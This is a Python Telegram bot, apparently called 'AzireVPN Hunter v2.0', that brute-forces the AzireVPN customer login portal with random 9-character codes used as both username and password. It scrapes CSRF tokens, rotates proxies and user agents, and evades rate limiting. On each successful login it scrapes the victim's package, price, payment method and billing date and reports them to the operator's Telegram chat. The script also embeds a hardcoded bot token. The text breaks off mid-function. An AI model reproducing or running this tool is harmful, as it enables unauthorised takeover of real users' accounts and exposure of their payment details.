import requests
import random
import string
import time
import threading
import re
import asyncio
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)

# ==================== CONFIG ====================
BOT_TOKEN = "8234802831:AAGHVgLobRN6dSXnKTm1eOS5nYJYxW_KRoM"
COMMANDER_ID = "inja bayad ChatID Admin bezarin"
LOGIN_URL = "https://manager.azirevpn.com/auth/login"
BASE_URL = "https://manager.azirevpn.com"

# ==================== GLOBAL STATE ====================
proxy_list = []
proxy_lock = threading.Lock()
is_running = False
cancel_flag = False
logs = []
logs_lock = threading.Lock()
current_delay = 1 
rate_limit_count = 0

# ==================== USER AGENTS ROTATIOn ====================
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0",
]

# ==================== BOLD MATH FONt ====================
BOLD_MATH = {
    'A': '𝗔', 'B': '𝗕', 'C': '𝗖', 'D': '𝗗', 'E': '𝗘', 'F': '𝗙',
    'G': '𝗚', 'H': '𝗛', 'I': '𝗜', 'J': '𝗝', 'K': '𝗞', 'L': '𝗟',
    'M': '𝗠', 'N': '𝗡', 'O': '𝗢', 'P': '𝗣', 'Q': '𝗤', 'R': '𝗥',
    'S': '𝗦', 'T': '𝗧', 'U': '𝗨', 'V': '𝗩', 'W': '𝗪', 'X': '𝗫',
    'Y': '𝗬', 'Z': '𝗭',
    'a': '𝗮', 'b': '𝗯', 'c': '𝗰', 'd': '𝗱', 'e': '𝗲', 'f': '𝗳',
    'g': '𝗴', 'h': '𝗵', 'i': '𝗶', 'j': '𝗷', 'k': '𝗸', 'l': '𝗹',
    'm': '𝗺', 'n': '𝗻', 'o': '𝗼', 'p': '𝗽', 'q': '𝗾', 'r': '𝗿',
    's': '𝘀', 't': '𝘁', 'u': '𝘂', 'v': '𝘃', 'w': '𝘄', 'x': '𝘅',
    'y': '𝘆', 'z': '𝘇',
    '0': '𝟬', '1': '𝟭', '2': '𝟮', '3': '𝟯', '4': '𝟰',
    '5': '𝟱', '6': '𝟲', '7': '𝟳', '8': '𝟴', '9': '𝟵',
    ':': ':', ' ': ' ', '.': '.', '/': '/', '-': '-', '_': '_',
    '@': '@', '#': '#', '!': '!', '?': '?', ',': ',', ';': ';',
    '(': '(', ')': ')', '[': '[', ']': ']', '{': '{', '}': '}',
    '+': '+', '=': '=', '*': '*', '&': '&', '%': '%', '$': '$',
    '\n': '\n'
}

def to_bold(text):
    return ''.join(BOLD_MATH.get(c, c) for c in str(text))

# ==================== GENERATED CODEs ====================
def generate_code(length=9):
    chars = string.ascii_uppercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

# ==================== LOGs SYSTEM ====================
def add_log(msg):
    with logs_lock:
        timestamp = time.strftime("%H:%M:%S")
        logs.append(f"[{timestamp}] {msg}")
        if len(logs) > 1000:
            logs.pop(0)

# ==================== PROXY MANAGEMENT ====================
def get_proxy():
    with proxy_lock:
        if not proxy_list:
            return None
        return random.choice(proxy_list)

def remove_proxy(proxy_str):
    with proxy_lock:
        if proxy_str in proxy_list:
            proxy_list.remove(proxy_str)
            add_log(f"💀 Proxy dead & removed: {proxy_str} | Remaining: {len(proxy_list)}")

def format_proxy(proxy_str):
    proxy_str = proxy_str.strip()
    if proxy_str.startswith(("socks5://", "socks4://", "http://", "https://")):
        return {"http": proxy_str, "https": proxy_str}
    
    parts = proxy_str.split(":")
    if len(parts) == 2:
        return {"http": f"http://{proxy_str}", "https": f"http://{proxy_str}"}
    elif len(parts) == 3:
        proto = parts[0].lower()
        host_port = f"{parts[1]}:{parts[2]}"
        if proto in ["socks4", "socks5", "http", "https"]:
            return {"http": f"{proto}://{host_port}", "https": f"{proto}://{host_port}"}
    elif len(parts) == 4:
        return {
            "http": f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}",
            "https": f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        }
    
    return {"http": f"http://{proxy_str}", "https": f"http://{proxy_str}"}

# ==================== SMART RATER LIMITER HANDLER ====================
class RateLimitManager:
    def __init__(self):
        self.consecutive_429 = 0
        self.base_delay = 1
        self.current_delay = 1
        self.max_delay = 120
        self.cooldown_until = 0
        self.total_429 = 0
        self.lock = threading.Lock()
    
    def hit_429(self, retry_after=None):
        with self.lock:
            self.consecutive_429 += 1
            self.total_429 += 1
            
            if retry_after and retry_after.isdigit():
                wait_time = int(retry_after) + random.randint(5, 15)
            else:
                wait_time = min(self.base_delay * (2 ** self.consecutive_429) + random.randint(3, 10), self.max_delay)
            
            self.current_delay = wait_time
            self.cooldown_until = time.time() + wait_time
            return wait_time
    
    def success(self):
        with self.lock:
            self.consecutive_429 = max(0, self.consecutive_429 - 1)
            if self.consecutive_429 == 0:
                self.current_delay = self.base_delay
    
    def is_cooling_down(self):
        with self.lock:
            if time.time() < self.cooldown_until:
                return True, self.cooldown_until - time.time()
            return False, 0
    
    def get_smart_delay(self):
        with self.lock:
            if self.consecutive_429 == 0:
                return random.uniform(1, 3)
            elif self.consecutive_429 < 3:
                return random.uniform(5, 10)
            elif self.consecutive_429 < 5:
                return random.uniform(15, 30)
            elif self.consecutive_429 < 10:
                return random.uniform(30, 60)
            else:
                return random.uniform(60, 120)

rate_limiter = RateLimitManager()

# ==================== LOGIN ATTEMPT ====================
def attempt_login(code):
    session = requests.Session()
    
    proxy_str = get_proxy()
    proxies = None
    if proxy_str:
        proxies = format_proxy(proxy_str)
    
    ua = random.choice(USER_AGENTS)
    
    headers_get = {
        "User-Agent": ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "sec-ch-ua": '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "Connection": "keep-alive",
    }
    
    try:
        resp = session.get(LOGIN_URL, headers=headers_get, proxies=proxies, timeout=20)

        if resp.status_code == 429:
            retry_after = resp.headers.get("retry-after", "")
            wait = rate_limiter.hit_429(retry_after)
            add_log(f"🚫 429 on GET | Wait: {wait}s | Proxy: {proxy_str or 'Direct'}")
            return {"status": "429", "wait": wait, "proxy": proxy_str}
        
        token = None
        patterns = [
            r'name="_token"\s*value="([^"]+)"',
            r'name="_token"\s+content="([^"]+)"',
            r'"_token"\s*:\s*"([^"]+)"',
            r'_token.*?value="([^"]+)"',
            r'<input[^>]*name="_token"[^>]*value="([^"]+)"',
            r'<meta[^>]*name="csrf-token"[^>]*content="([^"]+)"',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, resp.text)
            if match:
                token = match.group(1)
                break
        
        if not token:
            add_log(f"⚠️ No CSRF token | Status: {resp.status_code} | Proxy: {proxy_str or 'Direct'}")
            return {"status": "no_token", "proxy": proxy_str}
        
        time.sleep(random.uniform(0.5, 2.0))
        
        headers_post = {
            "User-Agent": ua,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://manager.azirevpn.com",
            "Referer": "https://manager.azirevpn.com/auth/login",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
            "sec-ch-ua": '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "Cache-Control": "max-age=0",
            "Connection": "keep-alive",
            "Priority": "u=0, i",
        }
        
        data = {
            "_token": token,
            "username": code,
            "password": code
        }
        
        resp2 = session.post(LOGIN_URL, data=data, headers=headers_post,
                             proxies=proxies, timeout=20, allow_redirects=True)
        
        if resp2.status_code == 429:
            retry_after = resp2.headers.get("retry-after", "")
            wait = rate_limiter.hit_429(retry_after)
            add_log(f"🚫 429 on POST | Code: {code} | Wait: {wait}s | Proxy: {proxy_str or 'Direct'}")
            return {"status": "429", "wait": wait, "proxy": proxy_str}
        
        if "too many requests" in resp2.text.lower() or "sorry" in resp2.text.lower()[:200]:
            if resp2.status_code != 200 or len(resp2.text) < 500:
                wait = rate_limiter.hit_429()
                add_log(f"🚫 Soft 429 (body) | Code: {code} | Wait: {wait}s")
                return {"status": "429", "wait": wait, "proxy": proxy_str}
        
        rate_limiter.success()
        
        final_url = resp2.url
        
        if "auth/login" not in final_url and resp2.status_code == 200:
            page = resp2.text
            
            if any(indicator in page for indicator in ["Package", "Next charge", "dashboard", "account", "logout", "Logout"]):
                details = extract_account_details(page)
                add_log(f"🎯 HIT! Code: {code}")
                return {
                    "status": "hit",
                    "code": code,
                    "details": details,
                    "proxy": proxy_str
                }
        
        remaining = resp2.headers.get("x-ratelimit-remaining", "")
        if remaining and remaining.isdigit():
            rem = int(remaining)
            if rem <= 2:
                add_log(f"⚠️ Rate limit low: {rem} remaining")
                rate_limiter.hit_429()
                return {"status": "rate_low", "remaining": rem, "proxy": proxy_str}
        
        add_log(f"❌ Miss: {code} | Proxy: {proxy_str or 'Direct'}")
        return {"status": "miss", "code": code, "proxy": proxy_str}
    
    except requests.exceptions.ProxyError:
        add_log(f"💀 Proxy error: {proxy_str}")
        if proxy_str:
            remove_proxy(proxy_str)
        return {"status": "proxy_error", "proxy": proxy_str}
    
    except requests.exceptions.ConnectTimeout:
        add_log(f"⏰ Connect timeout | Proxy: {proxy_str or 'Direct'}")
        if proxy_str:
            remove_proxy(proxy_str)
        return {"status": "timeout", "proxy": proxy_str}
    
    except requests.exceptions.ReadTimeout:
        add_log(f"⏰ Read timeout | Proxy: {proxy_str or 'Direct'}")
        return {"status": "timeout", "proxy": proxy_str}
    
    except requests.exceptions.ConnectionError:
        add_log(f"🔌 Connection error | Proxy: {proxy_str or 'Direct'}")
        if proxy_str:
            remove_proxy(proxy_str)
        return {"status": "conn_error", "proxy": proxy_str}
    
    except Exception as e:
        add_log(f"⚠️ Error: {str(e)[:100]}")
        return {"status": "error", "error": str(e)[:100], "proxy": proxy_str}

def extract_account_details(html):
    details = {}
    
    patterns = {
        'package': r'Package</dt>\s*<dd[^>]*>(.*?)</dd>',
        'price': r'Price</dt>\s*<dd[^>]*>(.*?)</dd>',
        'payment': r'Payment method</dt>\s*<dd[^>]*>(.*?)</dd>',
        'next_charge': r'Next charge</dt>\s*<dd[^>]*>(.*?)</dd>',
    }
    
    for key, pattern in patterns.items():
        match = re.search(pattern, html, re.DOTALL)
        if match:
            value = re.sub(r'<[^>]+>', '', match.group(1)).strip()
            details[key] = value
    
    return details

# ==================== AUTH ====================
def is_commander(user_id):
    return user_id == COMMANDER_ID

# ==================== BOT COMMANDS ====================
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_commander(update.effective_user.id):
        await update.message.reply_text("⛔ Access Denied.")
        return
    
    global is_running, cancel_flag, rate_limiter
    
    if is_running:
        await update.message.reply_text(
            "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "  ⚠️ 𝗔𝗹𝗿𝗲𝗮𝗱𝘆 𝗥𝘂𝗻𝗻𝗶𝗻𝗴!\n"
            "  𝗨𝘀𝗲 /cancell 𝘁𝗼 𝘀𝘁𝗼𝗽\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        return
    
    is_running = True
    cancel_flag = False
    rate_limiter = RateLimitManager()
    
    with proxy_lock:
        proxy_count = len(proxy_list)
    
    welcome = (
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "     ⚡ 𝗔𝗧𝗢𝗠 𝗧𝗘𝗔𝗠 ⚡\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "  🎯 𝗔𝘇𝗶𝗿𝗲𝗩𝗣𝗡 𝗛𝘂𝗻𝘁𝗲𝗿 𝘃𝟮.𝟬\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "  🟢 𝗢𝗽𝗲𝗿𝗮𝘁𝗶𝗼𝗻 𝗦𝘁𝗮𝗿𝘁𝗲𝗱!\n\n"
        "  📡 𝗠𝗼𝗱𝗲: 𝗦𝗺𝗮𝗿𝘁 𝗕𝗿𝘂𝘁𝗲\n"
        f"  🌐 𝗣𝗿𝗼𝘅𝗶𝗲𝘀: {to_bold(str(proxy_count))}\n"
        "  🛡️ 𝗔𝗻𝘁𝗶-𝟰𝟮𝟵: 𝗘𝗻𝗮𝗯𝗹𝗲𝗱\n"
        "  🔄 𝗔𝘂𝘁𝗼-𝗗𝗲𝗹𝗮𝘆: 𝗘𝗻𝗮𝗯𝗹𝗲𝗱\n\n"
        "  📊 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗶𝗻𝗴 & 𝗕𝗿𝘂𝘁𝗶𝗻𝗴...\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    
    await update.message.reply_text(welcome)
    context.application.create_task(brute_loop(update, context))

async def brute_loop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_running, cancel_flag
    
    checked = 0
    hits = 0
    total_429 = 0
    start_time = time.time()
    
    while not cancel_flag:
        is_cooling, remaining_time = rate_limiter.is_cooling_down()
        if is_cooling:
            remaining_int = int(remaining_time)
            if remaining_int > 5:
                await context.bot.send_message(
                    chat_id=COMMANDER_ID,
                    text=(
                        "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        "  🧊 𝗖𝗢𝗢𝗟𝗗𝗢𝗪𝗡 𝗠𝗢𝗗𝗘\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"  ⏳ 𝗪𝗮𝗶𝘁𝗶𝗻𝗴: {to_bold(str(remaining_int))}𝘀\n"
                        f"  🚫 𝗧𝗼𝘁𝗮𝗹 𝟰𝟮𝟵𝘀: {to_bold(str(total_429))}\n"
                        f"  🔢 𝗖𝗵𝗲𝗰𝗸𝗲𝗱: {to_bold(str(checked))}\n"
                        "  🛡️ 𝗔𝗻𝘁𝗶-𝟰𝟮𝟵 𝗔𝗰𝘁𝗶𝘃𝗲\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━"
                    )
                )
            
            while remaining_time > 0 and not cancel_flag:
                sleep_chunk = min(remaining_time, 5)
                await asyncio.sleep(sleep_chunk)
                remaining_time -= sleep_chunk
            
            if cancel_flag:
                break
            continue
        
        code = generate_code()
        
        result = await asyncio.get_event_loop().run_in_executor(
            None, attempt_login, code
        )
        
        if cancel_flag:
            break
        
        checked += 1
        
        if not result:
            await asyncio.sleep(rate_limiter.get_smart_delay())
            continue
        
        status = result.get("status", "")
        
        if status == "429":
            total_429 += 1
            wait = result.get("wait", 30)
            
            with proxy_lock:
                proxy_count = len(proxy_list)
            
            if proxy_count > 3:
                reduced_wait = min(wait, 10)
                await context.bot.send_message(
                    chat_id=COMMANDER_ID,
                    text=(
                        "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        "  🚫 𝟰𝟮𝟵 𝗗𝗘𝗧𝗘𝗖𝗧𝗘𝗗\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"  🔄 𝗦𝘄𝗶𝘁𝗰𝗵𝗶𝗻𝗴 𝗣𝗿𝗼𝘅𝘆...\n"
                        f"  ⏳ 𝗦𝗵𝗼𝗿𝘁 𝗪𝗮𝗶𝘁: {to_bold(str(reduced_wait))}𝘀\n"
                        f"  🌐 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 𝗟𝗲𝗳𝘁: {to_bold(str(proxy_count))}\n"
                        f"  🚫 𝗧𝗼𝘁𝗮𝗹 𝟰𝟮𝟵: {to_bold(str(total_429))}\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━"
                    )
                )
                await asyncio.sleep(reduced_wait)
            else:
                await context.bot.send_message(
                    chat_id=COMMANDER_ID,
                    text=(
                        "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        "  🚫 𝟰𝟮𝟵 𝗗𝗘𝗧𝗘𝗖𝗧𝗘𝗗\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"  ⏳ 𝗪𝗮𝗶𝘁𝗶𝗻𝗴: {to_bold(str(int(wait)))}𝘀\n"
                        f"  🚫 𝗧𝗼𝘁𝗮𝗹 𝟰𝟮𝟵: {to_bold(str(total_429))}\n"
                        f"  🔢 𝗖𝗵𝗲𝗰𝗸𝗲𝗱: {to_bold(str(checked))}\n"
                        f"  🌐 𝗣𝗿𝗼𝘅𝗶𝗲𝘀: {to_bold(str(proxy_count))}\n"
                        "  🛡️ 𝗔𝗻𝘁𝗶-𝟰𝟮𝟵 𝗔𝗰𝘁𝗶𝘃𝗲\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━"
                    )
                )
            continue
        
        elif status == "rate_low":
            rem = result.get("remaining", 0)
            add_log(f"⚠️ Rate limit low: {rem} left, slowing down")
            await asyncio.sleep(random.uniform(10, 20))
            continue
        
        elif status == "hit":
            hits += 1
            details = result.get("details", {})
            used_proxy = result.get("proxy", "Direct")
            
            hit_msg = (
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                "  💥💥💥 𝗛𝗜𝗧 𝗗𝗘𝗔𝗖𝗧𝗘𝗗 💥💥💥\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"  👤 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: {to_bold(code)}\n"
                f"  🔑 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱: {to_bold(code)}\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                "  📋 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗗𝗘𝗧𝗔𝗜𝗟𝗦\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            )
            
            if details.get('package'):
                hit_msg += f"  📦 𝗣𝗮𝗰𝗸𝗮𝗴𝗲: {to_bold(details['package'])}\n"
            if details.get('price'):
                hit_msg += f"  💰 𝗣𝗿𝗶𝗰𝗲: {to_bold(details['price'])}\n"
            if details.get('payment'):
                hit_msg += f"  💳 𝗣𝗮𝘆𝗺𝗲𝗻𝘁: {to_bold(details['payment'])}\n"
            if details.get('next_charge'):
                hit_msg += f"  📅 𝗡𝗲𝘅𝘁 𝗖𝗵𝗮𝗿𝗴𝗲: {to_bold(details['next_charge'])}\n"
            
            elapsed = int(time.time() - start_time)
            elapsed_str = f"{elapsed//3600}h {(elapsed%3600)//60}m {elapsed%60}s"
            
            hit_msg += (
                "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                "  📊 𝗦𝗧𝗔𝗧𝗦\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"  🔢 𝗖𝗵𝗲𝗰𝗸𝗲𝗱: {to_bold(str(checked))}\n"
                f"  🎯 𝗛𝗶𝘁𝘀: {to_bold(str(hits))}\n"
                f"  ⏱️ 𝗧𝗶𝗺𝗲: {to_bold(elapsed_str)}\n"
                "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                "     ⚡ 𝗔𝗧𝗢𝗠 𝗧𝗘𝗔𝗠 ⚡\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
            )
            
            await context.bot.send_message(chat_id=COMMANDER_ID, text=hit_msg)
        
        elif status in ["proxy_error", "conn_error"]:
            with proxy_lock:
                remaining = len(proxy_list)
            if remaining == 0:
                await context.bot.send_message(
                    chat_id=COMMANDER_ID,
                    text=(
                        "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        "  ⚠️ 𝗡𝗢 𝗣𝗥𝗢𝗫𝗜𝗘𝗦 𝗟𝗘𝗙𝗧!\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        "  📤 𝗦𝗲𝗻𝗱 .𝘁𝘅𝘁 𝗳𝗶𝗹𝗲\n"
                        "  🔄 𝗖𝗼𝗻𝘁𝗶𝗻𝘂𝗶𝗻𝗴 𝗗𝗶𝗿𝗲𝗰𝘁...\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━"
                    )
                )
            await asyncio.sleep(2)
            continue
        
        elif status == "timeout":
            await asyncio.sleep(3)
            continue
        
        if checked % 25 == 0:
            with proxy_lock:
                proxy_count = len(proxy_list)
            
            elapsed = int(time.time() - start_time)
            speed = checked / max(elapsed, 1) * 60 
            elapsed_str = f"{elapsed//3600}h {(elapsed%3600)//60}m {elapsed%60}s"
            
            status_msg = (
                "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                "  📊 𝗦𝗧𝗔𝗧𝗨𝗦 𝗨𝗣𝗗𝗔𝗧𝗘\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"  🔢 𝗖𝗵𝗲𝗰𝗸𝗲𝗱: {to_bold(str(checked))}\n"
                f"  🎯 𝗛𝗶𝘁𝘀: {to_bold(str(hits))}\n"
                f"  🚫 𝟰𝟮𝟵𝘀: {to_bold(str(total_429))}\n"
                f"  🌐 𝗣𝗿𝗼𝘅𝗶𝗲𝘀: {to_bold(str(proxy_count))}\n"
                f"  ⚡ 𝗦𝗽𝗲𝗲𝗱: {to_bold(f'{speed:.1f}')}/𝗺𝗶𝗻\n"
                f"  ⏱️ 𝗧𝗶𝗺𝗲: {to_bold(elapsed_str)}\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━"
            )
            await context.bot.send_message(chat_id=COMMANDER_ID, text=status_msg)
        
        delay = rate_limiter.get_smart_delay()
        await asyncio.sleep(delay)
    
    is_running = False
    elapsed = int(time.time() - start_time)
    elapsed_str = f"{elapsed//3600}h {(elapsed%3600)//60}m {elapsed%60}s"
    
    stop_msg = (
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "  🔴 𝗢𝗣𝗘𝗥𝗔𝗧𝗜𝗢𝗡 𝗦𝗧𝗢𝗣𝗣𝗘𝗗\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"  🔢 𝗧𝗼𝘁𝗮𝗹 𝗖𝗵𝗲𝗰𝗸𝗲𝗱: {to_bold(str(checked))}\n"
        f"  🎯 𝗧𝗼𝘁𝗮𝗹 𝗛𝗶𝘁𝘀: {to_bold(str(hits))}\n"
        f"  🚫 𝗧𝗼𝘁𝗮𝗹 𝟰𝟮𝟵𝘀: {to_bold(str(total_429))}\n"
        f"  ⏱️ 𝗧𝗼𝘁𝗮𝗹 𝗧𝗶𝗺𝗲: {to_bold(elapsed_str)}\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "     ⚡ 𝗔𝗧𝗢𝗠 𝗧𝗘𝗔𝗠 ⚡\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    
    await context.bot.send_message(chat_id=COMMANDER_ID, text=stop_msg)

async def cancel_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_commander(update.effective_user.id):
        await update.message.reply_text("⛔ Access Denied.")
        return
    
    global cancel_flag
    cancel_flag = True
    
    await update.message.reply_text(
        "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "  🛑 𝗖𝗮𝗻𝗰𝗲𝗹𝗹𝗶𝗻𝗴...\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━"
    )

async def logs_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_commander(update.effective_user.id):
        await update.message.reply_text("⛔ Access Denied.")
        return
    
    with logs_lock:
        if not logs:
            await update.message.reply_text(
                "━━━━━━━━━━━━━━━━━━━━━\n"
                "  📋 𝗡𝗼 𝗹𝗼𝗴𝘀 𝘆𝗲𝘁.\n"
                "━━━━━━━━━━━━━━━━━━━━━"
            )
            return
        last_logs = logs[-30:]
    
    log_text = (
        "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "  📋 𝗟𝗔𝗦𝗧 𝟯𝟬 𝗟𝗢𝗚𝗦\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    )
    for log in last_logs:
        log_text += f"{log}\n"
    log_text += "\n━━━━━━━━━━━━━━━━━━━━━━━━━"
    
    if len(log_text) > 4000:
        log_text = log_text[:4000] + "\n..."
    
    await update.message.reply_text(log_text)

async def setproxy_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_commander(update.effective_user.id):
        await update.message.reply_text("⛔ Access Denied.")
        return
    
    await update.message.reply_text(
        "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "  🌐 𝗦𝗘𝗧 𝗣𝗥𝗢𝗫𝗬\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "  📤 𝗦𝗲𝗻𝗱 𝗮 .𝘁𝘅𝘁 𝗳𝗶𝗹𝗲\n\n"
        "  𝗦𝘂𝗽𝗽𝗼𝗿𝘁𝗲𝗱 𝗙𝗼𝗿𝗺𝗮𝘁𝘀:\n"
        "  • ip:port\n"
        "  • http://ip:port\n"
        "  • socks4://ip:port\n"
        "  • socks5://ip:port\n"
        "  • ip:port:user:pass\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━"
    )

async def proxychecker_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_commander(update.effective_user.id):
        await update.message.reply_text("⛔ Access Denied.")
        return
    
    await update.message.reply_text(
        "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "  🔍 𝗣𝗥𝗢𝗫𝗬 𝗖𝗛𝗘𝗖𝗞𝗘𝗥\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "  📤 𝗦𝗲𝗻𝗱 𝗮 .𝘁𝘅𝘁 𝗳𝗶𝗹𝗲\n"
        "  𝘄𝗶𝘁𝗵 𝗽𝗿𝗼𝘅𝗶𝗲𝘀 𝘁𝗼 𝗰𝗵𝗲𝗰𝗸\n\n"
        "  𝗜'𝗹𝗹 𝘁𝗲𝘀𝘁 𝗲𝗮𝗰𝗵 𝗼𝗻𝗲!\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━"
    )

# ==================== PROXY CHECK ====================
def check_single_proxy(proxy_str):
    proxies = format_proxy(proxy_str)
    try:
        resp = requests.get(
            "https://httpbin.org/ip",
            proxies=proxies,
            timeout=10
        )
        return resp.status_code == 200
    except:
        return False

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_commander(update.effective_user.id):
        return
    
    document = update.message.document
    if not document.file_name.endswith('.txt'):
        return
    
    file = await context.bot.get_file(document.file_id)
    file_bytes = await file.download_as_bytearray()
    content = file_bytes.decode('utf-8', errors='ignore')
    
    raw_proxies = [line.strip() for line in content.splitlines() if line.strip() and not line.strip().startswith('#')]
    
    if not raw_proxies:
        await update.message.reply_text(to_bold("⚠️ No proxies found in file!"))
        return
    
    await update.message.reply_text(
        "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "  🔍 𝗣𝗥𝗢𝗫𝗬 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"  📊 𝗧𝗼𝘁𝗮𝗹: {to_bold(str(len(raw_proxies)))}\n"
        "  ⏳ 𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁...\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    
    alive = []
    dead = 0
    total = len(raw_proxies)
    
    for i, proxy in enumerate(raw_proxies):
        is_alive = await asyncio.get_event_loop().run_in_executor(
            None, check_single_proxy, proxy
        )
        
        if is_alive:
            alive.append(proxy)
        else:
            dead += 1
        
        if (i + 1) % 15 == 0 or (i + 1) == total:
            progress = int((i + 1) / total * 20)
            bar = "█" * progress + "░" * (20 - progress)
            pct = int((i + 1) / total * 100)
            
            try:
